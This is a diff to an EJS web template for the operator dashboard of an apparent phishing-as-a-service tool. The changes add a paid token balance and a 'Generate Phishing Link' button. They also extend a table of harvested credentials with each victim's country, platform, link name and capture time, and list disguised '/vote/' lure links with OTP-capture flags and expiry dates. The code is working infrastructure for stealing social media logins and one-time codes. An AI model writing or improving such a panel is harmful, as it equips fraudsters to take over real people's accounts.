@@ -1,7 +1,27 @@
 <div class="main-panel">
   <div class="content-wrapper">
     <div class="row">
-      <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
+      <div class="col-xl-4 col-sm-4 grid-margin stretch-card">
+        <div class="card">
+          <div class="card-body">
+            <div class="row">
+              <div class="col-9">
+                <div class="d-flex align-items-center align-self-start">
+                  <h3 class="mb-0"><%= req.user.tokens || 0 %> tokens</h3>
+                </div>
+              </div>
+              <div class="col-3">
+                <div class="icon icon-box-success">
+                  <span class="mdi mdi-cash icon-item"></span>
+                </div>
+              </div>
+            </div>
+            <h6 class="text-muted font-weight-normal">Purchase tokens</h6>
+            <a href="/pricing" class="btn btn-success">Buy Tokens</a>
+          </div>
+        </div>
+      </div>
+      <div class="col-xl-4 col-sm-4 grid-margin stretch-card">
         <div class="card">
           <div class="card-body">
             <div class="row">
@@ -21,7 +41,7 @@
           </div>
         </div>
       </div>
-      <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
+      <div class="col-xl-4 col-sm-4 grid-margin stretch-card">
         <div class="card">
           <div class="card-body">
             <div class="row">
@@ -38,7 +58,7 @@
             </div>
             <h6 class="text-muted font-weight-normal">Links</h6>
             <div>
-              <a href="/credentials" class="btn btn-secondary">See all</a>
+              <a href="/links" class="btn btn-secondary">See all</a>
             </div>
           </div>
         </div>
@@ -48,7 +68,9 @@
     <div class="row">
       <div class="grid-margin">
         <div class="container">
-          <a href="/create-link" class="btn btn-success my-3">Generate Link </a>
+          <a href="/create-link" class="btn btn-primary my-3"
+            >Generate Phishing Link
+          </a>
         </div>
       </div>
     </div>
@@ -64,12 +86,13 @@
                   <tr>
                     <th class="text-white">Credentials</th>
                     <th class="text-white">Social Media</th>
+                    <th class="text-white">Country</th>
                     <th class="text-white">Link Name</th>
                     <th class="text-white">Date</th>
                   </tr>
                 </thead>
                 <tbody>
-                  <% credentials.slice(0,11).forEach(c => {%>
+                  <% credentials.reverse().slice(0,11).forEach(c => {%>
                   <tr>
                     <td class="text-white">
                       <p class="text-white">
@@ -80,8 +103,11 @@
                       </p>
                     </td>
                     <td class="text-white"><%= c.linkType %></td>
+                    <td class="text-white"><%= c.country %></td>
                     <td class="text-white"><%= c.linkName %></td>
-                    <td class="text-white"><%= c.date %></td>
+                    <td class="text-white">
+                      <%= moment(c.date).format("MMM Do YY h:mm a") %>
+                    </td>
                   </tr>
                   <%})%>
                 </tbody>
@@ -114,29 +140,33 @@
                     <th class="text-white">Link</th>
                     <th class="text-white">Social Media</th>
                     <th class="text-white">Requires OTP</th>
-                    <th class="text-white">Date</th>
+                    <th class="text-white">Expires</th>
                   </tr>
                 </thead>
                 <tbody>
-                  <% links.slice(0,11).forEach((l, index) => {%>
+                  <% links.reverse().slice(0,11).forEach((l, index) => {%>
                   <tr>
                     <td class="text-white">
                       <input
                         type="text"
-                        class="copyInput"
+                        class="copyInput form-control bg-dark"
                         value="<%=req.app.voteUrl%>/vote/<%= l.link %>"
                         readonly
                       />
                       <button
-                        class="copyButton"
+                        class="copyButton btn btn-primary"
                         onclick="copyToClipboard(<%= index %>)"
                       >
                         Copy to Clipboard
                       </button>
                     </td>
-                    <td class="text-white">Instagram</td>
-                    <td class="text-white">Yes</td>
-                    <td class="text-white">04 Dec 2023 12:23pm</td>
+                    <td class="text-white"><%= l.linkType %></td>
+                    <td class="text-white">
+                      <%= l.otpEnabled ? "True": "False" %>
+                    </td>
+                    <td class="text-white">
+                      <%= moment(l.expiry).format("MMM Do YY h:mm a") %>
+                    </td>
                   </tr>
                   <%})%>
                 </tbody>
